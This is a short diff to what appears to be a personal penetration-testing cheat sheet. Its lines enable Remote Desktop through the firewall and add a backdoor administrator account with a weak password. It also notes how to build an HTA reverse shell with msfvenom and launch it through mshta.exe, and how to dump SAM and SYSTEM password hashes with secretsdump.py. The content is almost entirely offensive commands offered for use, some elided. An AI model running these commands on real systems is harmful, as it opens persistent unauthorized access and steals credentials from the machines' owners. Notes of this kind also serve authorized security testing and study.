@@ -17,10 +17,15 @@ Windows User Add in admins with RDP access
     netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
     net user eddwise Eddwise /add
     net localgroup administrators eddwise /add
+    
+adittionals:
 
-rev shellwith hta file:
-    msfvenom ..... -f hta-sch -o shell.hta
-    mshta.exe
+    rev shellwith hta file:
+        msfvenom ..... -f hta-sch -o shell.hta
+        mshta.exe
+
+    SAM and SYSTEM hashes:
+        secretsdump.py -sam SAM -system SYSTEM LOCAL
 
 Transfer File From Windows To Linux via ssh:
     1.on linux 2. on windows:
